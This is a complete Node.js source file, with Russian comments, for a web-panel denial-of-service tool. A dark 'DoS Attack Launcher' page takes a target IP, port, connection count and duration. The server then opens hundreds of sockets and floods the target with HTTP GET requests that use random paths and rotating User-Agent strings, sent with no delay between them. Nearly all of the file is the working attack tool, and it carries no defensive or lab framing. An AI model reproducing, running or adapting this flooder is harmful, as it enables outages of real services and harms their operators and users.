// server.js - единый файл для веб-интерфейса DoS (Node.js)
// Запуск: node server.js, затем открыть http://localhost:3000

const http = require('http');
const net = require('net');
const url = require('url');
const querystring = require('querystring');

// ---------- Глобальное состояние атаки ----------
let attackRunning = false;
let stopAttack = false;

// ---------- Встроенный HTML (интерфейс) ----------
const htmlPage = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>DoS Attack Panel (Node.js)</title>
  <style>
    body { background: #1e1e1e; color: #eee; font-family: Arial; padding: 30px; }
    .container { max-width: 500px; margin: auto; background: #2d2d2d; padding: 20px; border-radius: 8px; }
    label { display: inline-block; width: 120px; }
    input { width: 200px; padding: 5px; margin: 8px 0; background: #3d3d3d; border: 1px solid #555; color: #fff; border-radius: 4px; }
    button { background: #d32f2f; color: #fff; padding: 12px 30px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; margin-top: 15px; }
    button:disabled { background: #666; cursor: not-allowed; }
    #status { margin-top: 20px; font-weight: bold; }
    .ok { color: #4caf50; }
    .err { color: #f44336; }
    .run { color: #ff9800; }
  </style>
</head>
<body>
<div class="container">
  <h2>DoS Attack Launcher (Node.js)</h2>
  <div><label>Target IP:</label><input type="text" id="ip" value="192.168.1.1"></div>
  <div><label>Port:</label><input type="number" id="port" value="80"></div>
  <div><label>Threads (connections):</label><input type="number" id="threads" value="200"></div>
  <div><label>Duration (sec):</label><input type="number" id="duration" value="30"></div>
  <button id="startBtn">START ATTACK</button>
  <div id="status">Idle</div>
</div>
<script>
  const startBtn = document.getElementById('startBtn');
  const statusDiv = document.getElementById('status');
  function setStatus(msg, type) {
    statusDiv.textContent = msg;
    statusDiv.className = type || '';
  }
  startBtn.addEventListener('click', function() {
    const ip = document.getElementById('ip').value.trim();
    const port = parseInt(document.getElementById('port').value);
    const threads = parseInt(document.getElementById('threads').value);
    const duration = parseInt(document.getElementById('duration').value);
    if (!ip || isNaN(port) || isNaN(threads) || isNaN(duration) || threads <= 0 || duration <= 0) {
      setStatus('Invalid parameters', 'err');
      return;
    }
    startBtn.disabled = true;
    setStatus('Starting...', 'run');
    fetch('/start', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ip, port, threads, duration })
    })
    .then(res => res.json())
    .then(data => {
      if (data.status === 'ok') {
        setStatus('Attack running for ' + duration + ' sec', 'run');
        const interval = setInterval(() => {
          fetch('/status')
          .then(r => r.json())
          .then(s => {
            if (!s.running) {
              clearInterval(interval);
              setStatus('Attack finished', 'ok');
              startBtn.disabled = false;
            }
          });
        }, 1000);
      } else {
        setStatus('Error: ' + data.message, 'err');
        startBtn.disabled = false;
      }
    })
    .catch(err => {
      setStatus('Request failed', 'err');
      startBtn.disabled = false;
    });
  });
</script>
</body>
</html>`;

// ---------- Функция атаки (асинхронная) ----------
function startAttack(targetIp, targetPort, connections, durationSec) {
  if (attackRunning) return;
  attackRunning = true;
  stopAttack = false;
  console.log(`[ATTACK] Target ${targetIp}:${targetPort}, connections=${connections}, time=${durationSec}s`);

  // Генерация случайного пути и User-Agent
  const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
  ];
  function getRandomPath() {
    const chars = 'abcdefghijklmnopqrstuvwxyz';
    let path = '/';
    for (let i = 0; i < Math.floor(Math.random() * 10) + 5; i++) {
      path += chars[Math.floor(Math.random() * chars.length)];
    }
    return path;
  }
  function buildRequest(ip) {
    const path = getRandomPath();
    const ua = userAgents[Math.floor(Math.random() * userAgents.length)];
    return `GET ${path} HTTP/1.1\r\nHost: ${ip}\r\nUser-Agent: ${ua}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n`;
  }

  // Создаём массив задач (каждая задача – один сокет с циклической отправкой)
  const tasks = [];
  for (let i = 0; i < connections; i++) {
    tasks.push(new Promise((resolve) => {
      const sock = new net.Socket();
      let connected = false;
      sock.setTimeout(2000);
      sock.on('connect', () => {
        connected = true;
        // Цикл отправки пока не остановят
        function sendLoop() {
          if (stopAttack) {
            sock.destroy();
            resolve();
            return;
          }
          const req = buildRequest(targetIp);
          try {
            sock.write(req);
          } catch (e) {
            // ошибка записи – закрываем
            sock.destroy();
            resolve();
            return;
          }
          // Отправляем следующий запрос без задержки (максимальный флуд)
          // используем setImmediate для асинхронности
          setImmediate(sendLoop);
        }
        sendLoop();
      });
      sock.on('error', () => {
        if (!connected) {
          // не удалось подключиться – задача завершается
          resolve();
        } else {
          // ошибка после подключения – закрываем и завершаем
          sock.destroy();
          resolve();
        }
      });
      sock.on('close', () => {
        resolve();
      });
      sock.connect(targetPort, targetIp);
    }));
  }

  // Устанавливаем таймер остановки через durationSec секунд
  setTimeout(() => {
    stopAttack = true;
    console.log('[ATTACK] Stop signal sent');
  }, durationSec * 1000);

  // Ждём завершения всех задач (они завершатся при остановке или ошибках)
  Promise.all(tasks).then(() => {
    attackRunning = false;
    stopAttack = false;
    console.log('[ATTACK] Finished');
  });
}

// ---------- HTTP-сервер ----------
const server = http.createServer((req, res) => {
  const parsedUrl = url.parse(req.url, true);
  const pathname = parsedUrl.pathname;

  // Отдаём HTML
  if (pathname === '/' && req.method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(htmlPage);
    return;
  }

  // Статус атаки
  if (pathname === '/status' && req.method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ running: attackRunning }));
    return;
  }

  // Запуск атаки
  if (pathname === '/start' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        const ip = data.ip;
        const port = parseInt(data.port);
        const threads = parseInt(data.threads);
        const duration = parseInt(data.duration);
        if (!ip || isNaN(port) || isNaN(threads) || isNaN(duration) || threads <= 0 || duration <= 0) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ status: 'error', message: 'Invalid params' }));
          return;
        }
        if (attackRunning) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ status: 'error', message: 'Attack already running' }));
          return;
        }
        // Запускаем атаку (не ждём завершения)
        startAttack(ip, port, threads, duration);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'ok' }));
      } catch (e) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'error', message: 'Invalid JSON' }));
      }
    });
    return;
  }

  // 404
  res.writeHead(404);
  res.end();
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
